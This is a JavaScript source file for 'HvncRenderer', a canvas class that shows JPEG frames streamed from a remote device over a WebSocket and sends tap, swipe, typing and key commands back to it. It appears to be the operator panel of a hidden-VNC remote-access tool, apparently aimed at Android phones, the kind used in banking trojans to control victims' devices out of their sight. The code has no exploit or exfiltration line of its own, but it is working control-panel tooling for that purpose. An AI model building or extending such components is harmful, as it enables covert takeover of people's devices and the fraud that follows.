/**
 * HvncRenderer v2 — GPU-accelerated, zero-stall HVNC canvas renderer
 *
 * Binary frame format from device:
 *   byte[0]       = 0x01 (HVNC frame marker)
 *   bytes[1..4]   = uint32 big-endian JPEG size
 *   bytes[5..]    = JPEG data
 *
 * Pipeline:
 *   1. Receive ArrayBuffer over WebSocket (zero-copy, already binaryType='arraybuffer')
 *   2. Slice JPEG bytes → Blob → createImageBitmap() [GPU decode, off main thread]
 *   3. Store ImageBitmap in _pendingBitmap (drop stale frames if decode lags)
 *   4. requestAnimationFrame loop draws _pendingBitmap and closes previous one
 *
 * This keeps the main thread paint-loop clean — no decode stalls, no GC spikes,
 * always showing the freshest frame that GPU decode has finished.
 */
class HvncRenderer {
  constructor(canvas, ws, deviceId) {
    this.canvas   = canvas;
    this.ctx      = canvas.getContext('2d', { alpha: false, desynchronized: true });
    this.ws       = ws;
    this.deviceId = deviceId;

    this._active        = false;
    this._decoding      = false;   // gate: skip if GPU is still decoding last frame
    this._pendingBitmap = null;    // latest decoded ImageBitmap waiting for rAF
    this._currentBitmap = null;    // bitmap currently on canvas (needs close after swap)
    this._rafId         = null;

    // FPS counters
    this._frameCount  = 0;
    this._fps         = 0;
    this._fpsTimer    = setInterval(() => {
      this._fps = this._frameCount;
      this._frameCount = 0;
      if (this.onFps) this.onFps(this._fps);
    }, 1000);

    // Input state
    this._touchStart  = null;
    this._mouseDown   = null;
    this._rect        = null;         // cached bounding rect
    this._rectDirty   = true;

    this._initEvents();
    this._startRafLoop();
  }

  /* ── Frame ingestion ──────────────────────────────────────────────────────── */

  handleBinaryFrame(buffer) {
    const buf = new Uint8Array(buffer);
    if (buf[0] !== 0x01 || buffer.byteLength < 6) return;

    // Drop frame if GPU decode of previous frame hasn't finished — prevents queuing
    if (this._decoding) return;
    this._decoding = true;

    // Slice JPEG bytes (zero-copy view, then blob wraps it without extra alloc)
    const jpegSlice = buffer.slice(5); // ArrayBuffer.slice — necessary for Blob boundary
    const blob      = new Blob([jpegSlice], { type: 'image/jpeg' });

    createImageBitmap(blob).then(bmp => {
      // Resize canvas once on first frame or resolution change
      if (this.canvas.width !== bmp.width || this.canvas.height !== bmp.height) {
        this.canvas.width  = bmp.width  || 350;
        this.canvas.height = bmp.height || 650;
        this._rectDirty = true;
      }

      // If a pending bitmap is already waiting for rAF, close it (we're newer)
      if (this._pendingBitmap) {
        this._pendingBitmap.close();
      }
      this._pendingBitmap = bmp;
      this._decoding      = false;
      this._active        = true;
    }).catch(() => { this._decoding = false; });
  }

  /* ── rAF draw loop ────────────────────────────────────────────────────────── */

  _startRafLoop() {
    const draw = () => {
      this._rafId = requestAnimationFrame(draw);
      if (!this._pendingBitmap) return;

      // Paint new bitmap
      this.ctx.drawImage(this._pendingBitmap, 0, 0);
      this._frameCount++;

      // Close previous bitmap to free GPU texture
      if (this._currentBitmap) this._currentBitmap.close();
      this._currentBitmap = this._pendingBitmap;
      this._pendingBitmap = null;
    };
    this._rafId = requestAnimationFrame(draw);
  }

  /* ── Input events ─────────────────────────────────────────────────────────── */

  _initEvents() {
    const c = this.canvas;

    // Invalidate rect cache on resize/scroll
    const obs = new ResizeObserver(() => { this._rectDirty = true; });
    obs.observe(c);
    this._resizeObserver = obs;

    /* Touch */
    c.addEventListener('touchstart', e => {
      e.preventDefault();
      this._rectDirty = true;
      const t = e.touches[0];
      this._touchStart = { x: t.clientX, y: t.clientY };
      const { x, y } = this._clientToDevice(t.clientX, t.clientY);
      this._sendTap(x, y);
    }, { passive: false });

    c.addEventListener('touchmove', e => {
      e.preventDefault();
      if (!this._touchStart) return;
      const t = e.touches[0];
      const from = this._clientToDevice(this._touchStart.x, this._touchStart.y);
      const to   = this._clientToDevice(t.clientX, t.clientY);
      // Throttle: only send if moved ≥ 2 device pixels
      if (Math.abs(to.x - from.x) + Math.abs(to.y - from.y) < 2) return;
      this._sendSwipe(from.x, from.y, to.x, to.y);
      this._touchStart = { x: t.clientX, y: t.clientY };
    }, { passive: false });

    c.addEventListener('touchend', e => {
      e.preventDefault();
      this._touchStart = null;
    }, { passive: false });

    /* Mouse (desktop fallback) */
    c.addEventListener('mousedown', e => {
      this._rectDirty = true;
      this._mouseDown = { x: e.clientX, y: e.clientY };
    });

    c.addEventListener('mousemove', e => {
      if (!this._mouseDown || !(e.buttons & 1)) return;
      const from = this._clientToDevice(this._mouseDown.x, this._mouseDown.y);
      const to   = this._clientToDevice(e.clientX, e.clientY);
      if (Math.abs(to.x - from.x) + Math.abs(to.y - from.y) < 2) return;
      this._sendSwipe(from.x, from.y, to.x, to.y);
      this._mouseDown = { x: e.clientX, y: e.clientY };
    });

    c.addEventListener('click', e => {
      const { x, y } = this._clientToDevice(e.clientX, e.clientY);
      this._sendTap(x, y);
    });

    c.addEventListener('mouseup', () => { this._mouseDown = null; });
  }

  _rect_get() {
    if (this._rectDirty || !this._rect) {
      this._rect = this.canvas.getBoundingClientRect();
      this._rectDirty = false;
    }
    return this._rect;
  }

  _clientToDevice(clientX, clientY) {
    const r      = this._rect_get();
    const scaleX = this.canvas.width  / r.width;
    const scaleY = this.canvas.height / r.height;
    return {
      x: Math.round((clientX - r.left) * scaleX),
      y: Math.round((clientY - r.top)  * scaleY),
    };
  }

  /* ── Commands ─────────────────────────────────────────────────────────────── */

  _sendTap(x, y) {
    this.ws.send({ type: 'command', deviceId: this.deviceId, action: 'TAP', x, y });
  }

  _sendSwipe(x1, y1, x2, y2) {
    this.ws.send({ type: 'command', deviceId: this.deviceId,
      action: 'SWIPE', x1, y1, x2, y2, duration: 80 });
  }

  sendType(text) {
    this.ws.send({ type: 'command', deviceId: this.deviceId, action: 'TYPE', text });
  }

  sendKey(keyCode) {
    this.ws.send({ type: 'command', deviceId: this.deviceId, action: 'KEY', keyCode });
  }

  /* ── Teardown ─────────────────────────────────────────────────────────────── */

  destroy() {
    cancelAnimationFrame(this._rafId);
    clearInterval(this._fpsTimer);
    if (this._resizeObserver) this._resizeObserver.disconnect();
    if (this._pendingBitmap) { this._pendingBitmap.close(); this._pendingBitmap = null; }
    if (this._currentBitmap) { this._currentBitmap.close(); this._currentBitmap = null; }
    this._active = false;
  }

  get fps()    { return this._fps; }
  get active() { return this._active; }
}

window.HvncRenderer = HvncRenderer;
